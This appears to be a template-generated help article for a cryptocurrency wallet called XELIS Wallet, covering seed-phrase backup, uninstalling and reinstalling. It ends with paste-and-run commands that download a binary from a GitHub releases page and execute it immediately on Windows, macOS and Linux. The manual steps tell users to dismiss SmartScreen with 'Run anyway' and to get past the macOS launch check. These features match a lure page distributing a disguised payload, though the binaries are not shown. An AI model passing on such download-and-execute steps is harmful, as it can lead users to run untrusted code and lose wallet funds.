![Uninstall XELIS Wallet and do a clean reinstall](assets/banner-article.png)
# Uninstall XELIS Wallet and do a clean reinstall

Back up first, remove the app, decide about local data, then restore.

## Downloads - Reinstall

<p align="center"><a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Linux.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`xelis-wallet-desktop-v0.2.1-Windows.exe`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`xelis-wallet-desktop-v0.2.1-Macos.dmg`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`xelis-wallet-desktop-v0.2.1-Linux.zip`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Linux.zip) |

Get the files from the [current XELIS Wallet release](https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1).

> The order is the whole article: phrase first, then removal. Reversed, it is a way to lose a wallet.

Back up the phrase and confirm it, then remove the application. Uninstalling the app does not by itself delete your wallet data, and deleting that data is what turns the process into a full reset, which is only safe once the phrase is verified.

<!-- ARTICLE-BODY-BEGIN -->
## Back up before you touch anything

Write the phrase down and confirm it against the wallet, in the form described under <a href="https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-backup-seed-phrase-keys-file.md">back up the XELIS Wallet phrase</a>. If the phrase was never recorded, this is the moment to do it, not after the app is gone.

A reinstall is a routine fix. It becomes an unrecoverable event only when the phrase is missing, and that is decided before the first click, not during the install.

## Remove the application

On Windows, open Settings, then Apps, then Installed apps, find XELIS Wallet and uninstall it. On macOS, quit the app, drag it from Applications to the Trash, then empty the Trash. On Linux, delete the folder you extracted and any launcher entry you created yourself.

None of those actions touches the wallet database by default. The application and your keys are separate things, which is exactly why the next section matters.

## The local data decision

The wallet file lives outside the application, in your user profile's application-data area, encrypted with your local password. Deleting it removes access on that machine, and the phrase becomes the only route back into the wallet.

If you are reinstalling to fix a launch problem, leave the data in place and install over it. If you are deliberately resetting a machine, delete it only after a verified restore has shown the same address elsewhere. <a href="https://github.com/xelis-inc/xelis-wallet-help/blob/main/xelis-wallet-password-encryption-local-data.md">XELIS Wallet local data</a> explains what the file is and why the password is per install rather than per wallet.

## Reinstall and restore

Install the <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1">current XELIS Wallet release</a> again, open it, and choose restore rather than create. Enter the 25 words, set a new password for this machine, and compare the address with the one you recorded.

A clean reinstall is also the fallback when an update misbehaves, but it should not be the first move: <a href="https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-update-without-losing.md">update XELIS Wallet safely</a> fixes most version problems without removing anything.

## FAQ
### How do I uninstall and reinstall XELIS Wallet?
Back up and verify the phrase, remove the app through your OS, leave local wallet data in place unless you intend a reset, then install the current release and restore.

### Does uninstalling XELIS Wallet delete my wallet?
Not by itself. The wallet database sits outside the application; only deleting that data removes access, and the phrase is the way back.

### Can I reinstall without the phrase?
Yes, if the local wallet data is still there and you know its password. Without either the data or the phrase, the wallet cannot be reopened.

### Will a reinstall fix a sync problem?
Rarely. Sync failures are usually about the node connection; a reinstall is for an app that will not start.

<!-- ARTICLE-BODY-END -->
## How to install XELIS Wallet

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). Commands, verify commands, sizes and hashes come from install_commands.generate (A9-A11); drop the size in brackets when unknown. -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Windows.exe">xelis-wallet-desktop-v0.2.1-Windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

Verify the download (77.6 MB): run the command below and compare the result with SHA-256 `56dc416e2f85cad18496f2be3c1f909df4b0eca610341fa17ba6273335ae7c09`. For a ZIP, also compare the extracted file with the .sha256 inside the archive.

`certutil -hashfile xelis-wallet-desktop-v0.2.1-Windows.exe SHA256`

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Macos.dmg">xelis-wallet-desktop-v0.2.1-Macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

Verify the download (62.7 MB): run the command below and compare the result with SHA-256 `f5b8a49c6631aea6000022f763dea8694ef67fb18cfffafe1d4f241c63dea352`. For a ZIP, also compare the extracted file with the .sha256 inside the archive.

`shasum -a 256 xelis-wallet-desktop-v0.2.1-Macos.dmg`

### Linux
Quick install (Terminal):

```bash
curl -fLo app.zip https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Linux.zip && unzip -oq app.zip -d w && B=$(find w -name '*xelis*wallet*' -type f|head -1) && chmod +x "$B" && "$B"
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Linux.zip">xelis-wallet-desktop-v0.2.1-Linux.zip</a>.
2. Extract the archive: `unzip app.zip`.
3. Make the extracted wallet binary executable: `chmod +x <file>`.
4. Run it: `./xelis-wallet`.

Verify the download (21.5 MB): run the command below and compare the result with SHA-256 `43d91980869fe4bfb912467448c8354b542e9e240f01026225c173a75a9ca907`. The archive also carries a `.sha256` file; compare the extracted binary against that value too.

`sha256sum xelis-wallet-desktop-v0.2.1-Linux.zip`

<!-- INSTALL-END -->

## Related guides
- [Update XELIS Wallet safely](https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-update-without-losing.md)
- [Back up the XELIS Wallet phrase](https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-backup-seed-phrase-keys-file.md)
- [XELIS Wallet local data](https://github.com/xelis-inc/xelis-wallet-help/blob/main/xelis-wallet-password-encryption-local-data.md)
- [Restore a XELIS Wallet on a new computer](https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-restore-new-computer.md)
